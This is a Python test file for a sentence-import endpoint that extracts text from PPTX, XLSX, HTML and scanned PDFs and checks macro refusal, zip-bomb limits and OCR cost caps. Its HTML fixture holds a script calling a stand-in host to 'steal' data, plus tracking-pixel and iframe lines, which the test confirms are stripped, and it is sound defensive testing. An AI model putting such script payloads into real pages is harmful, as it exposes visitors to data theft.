"""POST /import/sentences for PPTX, XLSX, HTML and scanned PDF: sniffing, limits and OCR."""

from __future__ import annotations

import io
import uuid
import zipfile

import httpx
import pytest
from sqlalchemy import text

from app.clients import db_client
from app.clients.ocr_client import (
    OcrProviderError,
    OcrRequest,
    OcrResult,
    OcrTimeout,
    set_ocr_client,
)
from app.config import PagePrice, get_settings
from app.models.storage.document_import import DocumentImport
from app.utilities import document_text
from app.utilities.document_errors import DocumentTooLargeError
from app.utilities.ooxml_archive import MAX_COMPRESSION_RATIO
from tests.conftest import TenantFixture
from tests.office_files import (
    DOCX_MAIN,
    PPTM_MAIN,
    PPTX_MAIN,
    PPTX_TYPE,
    XLSX_TYPE,
    content_types,
    pptx,
    xlsx,
    zipped,
)
from tests.test_imports import cite, pdf, upload
from tests.test_teach import set_settings

pytestmark = pytest.mark.asyncio(loop_scope="session")

HTML = b"""<!DOCTYPE html>
<html><head><title>Plant handbook</title><style>p { color: red }</style>
<script>fetch('https://attacker.example/steal')</script></head>
<body><h1>Operations overview</h1>
<p>A plant has many machines. Each machine has sensors.</p>
<img src="https://attacker.example/pixel.png">
<iframe src="https://attacker.example/">Hidden frame text here</iframe>
<ul><li>Operators run the lines every day.</li><li>Short</li></ul>
<svg><text>Vector text inside a drawing</text></svg>
<template><p>Template text never shown</p></template>
</body></html>"""


class FakeOcr:
    """An OCR client answering from a page map; records every request."""

    provider = "fake"
    model = "fake-ocr-1"
    price = PagePrice(eurPerPage="0.002")

    def __init__(self, pages: dict[int, str] | None = None, error: Exception | None = None):
        self.pages = pages or {}
        self.error = error
        self.requests: list[OcrRequest] = []

    async def recognise(self, request: OcrRequest) -> OcrResult:
        self.requests.append(request)
        if self.error:
            raise self.error
        found = {p: self.pages[p] for p in request.pages if p in self.pages}
        return OcrResult(found, len(found), 0, 0, 1200)


async def ocr_calls(tenant: TenantFixture) -> list[dict]:
    async with db_client.get_session_factory()() as s:
        rows = await s.execute(
            text(
                "SELECT purpose, model, pages, outcome, cost_eur FROM ontaix.llm_call "
                "WHERE tenant_id = :t ORDER BY occurred_at"
            ),
            {"t": tenant.tenant_id},
        )
        return [dict(r._mapping) for r in rows]


async def test_a_deck_imports_slide_text_and_notes_in_slide_order(
    client: httpx.AsyncClient, tenant: TenantFixture
) -> None:
    data = pptx(
        [
            (
                ["Operations overview", "A plant has many machines."],
                ["Speaker notes say sensors matter."],
            ),
            (["Machines have sensors today."], []),
        ]
    )

    response = await upload(client, tenant.builder, "deck.pptx", data, PPTX_TYPE)

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["sentences"] == [
        "Operations overview",
        "A plant has many machines.",
        "Speaker notes say sensors matter.",
        "Machines have sensors today.",
    ]
    assert body["positions"] == [{"unit": "slide", "index": 1}] * 3 + [
        {"unit": "slide", "index": 2}
    ]
    assert body["originDetail"]["mediaType"] == PPTX_TYPE
    parsed = await cite(client, tenant, tenant.builder, body["importId"], 3)
    assert parsed.json()["originDetail"]["position"] == {"unit": "slide", "index": 2}


async def test_a_workbook_imports_one_sentence_per_row_with_sheet_and_row(
    client: httpx.AsyncClient, tenant: TenantFixture
) -> None:
    data = xlsx(
        [
            [["Machine", "Line", "Sensors"], ["Press 12", "Line A", 4], ["ok"], []],
            [["Warehouse", "holds", "finished goods"]],
        ],
        formula_cells={"C2": ("=SUM(1,3)+EXTERNAL('x')", "4")},
    )

    response = await upload(client, tenant.builder, "plant.xlsx", data, XLSX_TYPE)

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["sentences"] == [
        "Machine, Line, Sensors",
        "Press 12, Line A, 4",
        "Warehouse, holds, finished goods",
    ]
    assert body["positions"] == [
        {"unit": "sheet", "index": 1, "row": 1},
        {"unit": "sheet", "index": 1, "row": 2},
        {"unit": "sheet", "index": 2, "row": 1},
    ]
    parsed = await cite(client, tenant, tenant.builder, body["importId"], 1)
    detail = parsed.json()["originDetail"]
    assert detail["position"] == {"unit": "sheet", "index": 1, "row": 2}
    assert detail["mediaType"] == XLSX_TYPE


async def test_a_web_page_imports_its_text_and_drops_script_like_content(
    client: httpx.AsyncClient, tenant: TenantFixture
) -> None:
    response = await upload(client, tenant.builder, "handbook.html", HTML, "text/html")

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["sentences"] == [
        "Plant handbook",
        "Operations overview",
        "A plant has many machines.",
        "Each machine has sensors.",
        "Operators run the lines every day.",
    ]
    assert all(p["unit"] == "paragraph" for p in body["positions"])
    joined = " ".join(body["sentences"])
    for dropped in ("fetch", "color", "Hidden frame", "Vector text", "Template text"):
        assert dropped not in joined


@pytest.mark.parametrize(
    ("name", "data", "declared"),
    [
        ("deck.pptx", pptx([(["A plant has many machines."], [])], PPTM_MAIN), PPTX_TYPE),
        (
            "deck.pptx",
            pptx([(["A plant has many machines."], [])], extra={"ppt/vbaProject.bin": b"x"}),
            PPTX_TYPE,
        ),
        (
            "old.docx",
            b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 600,
            "application/octet-stream",
        ),
        (
            "two.docx",
            zipped(
                {
                    "[Content_Types].xml": content_types(
                        {"word/document.xml": DOCX_MAIN, "ppt/presentation.xml": PPTX_MAIN}
                    )
                }
            ),
            "application/octet-stream",
        ),
        ("archive.docx", zipped({"readme.txt": "A plant has many machines."}), "text/plain"),
        ("page.txt", HTML, "text/plain"),
        ("page.html", b"A plant has many machines.", "text/html"),
        ("deck.docx", pptx([(["A plant has many machines."], [])]), "application/octet-stream"),
    ],
)
async def test_sniffing_refuses_macros_legacy_files_and_disagreeing_types(
    client: httpx.AsyncClient, tenant: TenantFixture, name: str, data: bytes, declared: str
) -> None:
    response = await upload(client, tenant.builder, name, data, declared)

    assert response.status_code == 415, response.text
    assert response.json()["code"] == "unsupported_media_type"


async def test_a_utf16_text_file_is_read_as_text(
    client: httpx.AsyncClient, tenant: TenantFixture
) -> None:
    data = "A plant has many machines.".encode("utf-16")

    response = await upload(client, tenant.builder, "notes.txt", data, "text/plain")

    assert response.status_code == 200, response.text
    assert response.json()["sentences"] == ["A plant has many machines."]


async def test_office_and_page_limits_refuse_the_whole_document() -> None:
    too_many_sheets = xlsx([[["Machine", "Line"]]] * 51)
    with pytest.raises(DocumentTooLargeError, match="sheets"):
        document_text.extract_document(too_many_sheets, document_text.XLSX)
    deep = b"<html><body>" + b"<div>" * 600 + b"text" + b"</div>" * 600 + b"</body></html>"
    with pytest.raises(DocumentTooLargeError, match="nests"):
        document_text.extract_document(deep, document_text.TEXT_HTML)
    large = b"<html><body>" + b"<p>A plant has many machines.</p>" * 200_000 + b"</body></html>"
    with pytest.raises(DocumentTooLargeError, match="MiB"):
        document_text.extract_document(large, document_text.TEXT_HTML)
    slides = pptx([(["x"], [])])
    many_ids = "".join(f'<p:sldId id="{256 + i}" r:id="rId1"/>' for i in range(501))
    slides = _replace(
        slides,
        "ppt/presentation.xml",
        '<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        f"<p:sldIdLst>{many_ids}</p:sldIdLst></p:presentation>",
    )
    with pytest.raises(DocumentTooLargeError, match="slides"):
        document_text.extract_document(slides, document_text.PPTX)


async def test_archives_are_bounded_in_members_and_compression_ratio() -> None:
    members = {f"ppt/m{i}.xml": "<x/>" for i in range(1001)}
    with pytest.raises(DocumentTooLargeError, match="members"):
        document_text.extract_document(zipped(members), document_text.PPTX)
    bomb = pptx([(["A plant has many machines."], [])])
    bomb = _replace(
        bomb,
        "ppt/slides/slide1.xml",
        '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">'
        + " " * (MAX_COMPRESSION_RATIO * 2000)
        + "</p:sld>",
    )
    with pytest.raises(DocumentTooLargeError, match="inflates"):
        document_text.extract_document(bomb, document_text.PPTX)


async def test_scanned_pages_are_recognised_and_joined_in_page_order(
    client: httpx.AsyncClient, tenant: TenantFixture
) -> None:
    fake = FakeOcr({1: "# Scanned plant\n\nA scanned page lists ![logo](x.png) every machine."})
    set_ocr_client(fake)
    data = pdf(["", "A warehouse holds finished stock."])

    response = await upload(client, tenant.builder, "scan.pdf", data, "application/pdf")

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["sentences"] == [
        "Scanned plant A scanned page lists every machine.",
        "A warehouse holds finished stock.",
    ]
    assert body["positions"] == [{"unit": "page", "index": 1}, {"unit": "page", "index": 2}]
    assert [r.pages for r in fake.requests] == [[1]]
    assert fake.requests[0].pdf == data
    async with db_client.get_session_factory()() as s:
        row = await s.get(DocumentImport, uuid.UUID(body["importId"]))
        assert row is not None and row.ocr_pages == 1
    [call] = await ocr_calls(tenant)
    assert (call["purpose"], call["model"], call["pages"], call["outcome"]) == (
        "document_ocr",
        "fake-ocr-1",
        1,
        "used",
    )
    assert float(call["cost_eur"]) == pytest.approx(0.002)
    cost = (await client.get("/cost", headers=tenant.admin.headers)).json()["llm"]
    assert cost["ocrPagesUsed"] == 1 and cost["ocrPageCap"] == 1000
    assert {"purpose": "document_ocr", "calls": 1, "pages": 1, "costEur": 0.002} in cost[
        "byPurpose"
    ]


@pytest.mark.parametrize(
    "error", [OcrTimeout("timeout", latency_ms=5000), OcrProviderError("status")]
)
async def test_a_failed_ocr_call_refuses_the_import_and_records_the_call(
    client: httpx.AsyncClient, tenant: TenantFixture, error: Exception
) -> None:
    set_ocr_client(FakeOcr(error=error))

    response = await upload(
        client, tenant.builder, "scan.pdf", pdf(["", "A warehouse holds stock."])
    )

    assert response.status_code == 503, response.text
    assert response.json()["code"] == "unavailable"
    [call] = await ocr_calls(tenant)
    assert call["outcome"] == ("timeout" if isinstance(error, OcrTimeout) else "provider_error")
    assert call["pages"] == 0 and float(call["cost_eur"]) == 0
    assert await _import_count(tenant) == 0


async def test_a_result_missing_a_page_refuses_the_import(
    client: httpx.AsyncClient, tenant: TenantFixture
) -> None:
    set_ocr_client(FakeOcr({}))

    response = await upload(client, tenant.builder, "scan.pdf", pdf(["", ""]))

    assert response.status_code == 503, response.text
    assert await _import_count(tenant) == 0


async def test_ocr_not_configured_or_turned_off_refuses_a_scanned_pdf_only(
    client: httpx.AsyncClient, tenant: TenantFixture
) -> None:
    scanned = pdf(["", "A warehouse holds finished stock."])
    set_ocr_client(None)
    assert (await upload(client, tenant.builder, "scan.pdf", scanned)).status_code == 503

    fake = FakeOcr({1: "A scanned page lists every machine."})
    set_ocr_client(fake)
    await set_settings(tenant, ocr_monthly_page_cap=0)
    assert (await upload(client, tenant.builder, "scan.pdf", scanned)).status_code == 503
    await set_settings(tenant, ocr_monthly_page_cap=1000, llm_monthly_token_cap=0)
    assert (await upload(client, tenant.builder, "scan.pdf", scanned)).status_code == 503
    text_pdf = pdf(["A warehouse holds finished stock."])
    assert (await upload(client, tenant.builder, "text.pdf", text_pdf)).status_code == 200
    assert fake.requests == []


async def test_the_monthly_page_cap_and_the_page_limit_bound_ocr(
    client: httpx.AsyncClient, tenant: TenantFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakeOcr({1: "A scanned page lists every machine.", 2: "Another page of text."})
    set_ocr_client(fake)
    await set_settings(tenant, ocr_monthly_page_cap=1)

    capped = await upload(client, tenant.builder, "scan.pdf", pdf(["", ""]))
    assert capped.status_code == 503, capped.text

    monkeypatch.setattr(get_settings(), "ocr_max_pages", 1)
    too_many = await upload(client, tenant.builder, "scan.pdf", pdf(["", ""]))
    assert too_many.status_code == 413, too_many.text
    assert fake.requests == []


async def test_the_hourly_ocr_budget_is_charged_per_page(
    client: httpx.AsyncClient, tenant: TenantFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    set_ocr_client(FakeOcr({1: "A scanned page lists every machine.", 2: "Another scanned page."}))
    monkeypatch.setattr(get_settings(), "ocr_pages_per_hour", 3)

    first = await upload(client, tenant.builder, "scan.pdf", pdf(["", ""]))
    second = await upload(client, tenant.builder, "scan.pdf", pdf(["", ""]))

    assert first.status_code == 200, first.text
    assert second.status_code == 429 and second.json()["code"] == "rate_limited"


async def _import_count(tenant: TenantFixture) -> int:
    async with db_client.get_session_factory()() as s:
        return int(
            await s.scalar(
                text("SELECT count(*) FROM ontaix.document_import WHERE tenant_id = :t"),
                {"t": tenant.tenant_id},
            )
            or 0
        )


def _replace(data: bytes, name: str, body: str) -> bytes:
    source = zipfile.ZipFile(io.BytesIO(data))
    parts = {n: source.read(n) for n in source.namelist()}
    parts[name] = body.encode()
    return zipped(parts)
